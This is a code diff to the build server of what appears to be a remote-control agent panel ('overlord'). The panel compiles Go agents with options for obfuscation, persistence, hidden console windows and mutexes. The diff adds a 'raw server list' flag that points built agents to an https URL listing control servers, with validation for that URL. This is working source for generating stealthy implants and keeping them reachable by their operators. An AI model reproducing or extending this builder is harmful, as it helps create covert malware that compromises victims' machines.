@@ -457,6 +457,7 @@ async function startBuildProcess(
   config: {
     platforms: string[];
     serverUrl?: string;
+    rawServerList?: boolean;
     customId?: string;
     countryCode?: string;
     mutex?: string;
@@ -596,6 +597,12 @@ async function startBuildProcess(
         const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
         ldflags = `${ldflags} ${serverFlag}`;
         sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
+      }
+
+      if (config.rawServerList) {
+        const rawServerFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
+        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
+        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
       }
 
       if (buildMutex) {
@@ -1836,7 +1843,7 @@ async function startServer() {
             requirePermission(user, "clients:control");
             
             const body = await req.json();
-            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex, hideConsole } = body;
+            const { platforms, serverUrl, rawServerList, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex, hideConsole } = body;
             
             if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
               return Response.json({ error: "No platforms specified" }, { status: 400 });
@@ -1856,6 +1863,22 @@ async function startServer() {
             if (sanitizedPlatforms.length !== platforms.length) {
               return Response.json({ error: "Invalid platform entries" }, { status: 400 });
             }
+
+            const safeRawServerList = !!rawServerList;
+            const safeServerUrl = typeof serverUrl === "string" && serverUrl.trim() !== "" ? serverUrl.trim() : undefined;
+            if (safeRawServerList) {
+              if (!safeServerUrl) {
+                return Response.json({ error: "Raw server list requires a server URL" }, { status: 400 });
+              }
+              try {
+                const parsed = new URL(safeServerUrl);
+                if (parsed.protocol !== "https:") {
+                  return Response.json({ error: "Raw server list URL must use https" }, { status: 400 });
+                }
+              } catch {
+                return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
+              }
+            }
             
             const buildId = uuidv4();
             const ip = server.requestIP(req)?.address || "unknown";
@@ -1870,7 +1893,7 @@ async function startServer() {
             });
             
             
-            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence, hideConsole: !!hideConsole });
+            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl: safeServerUrl, rawServerList: safeRawServerList, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence, hideConsole: !!hideConsole });
             
             return Response.json({ buildId });
           }
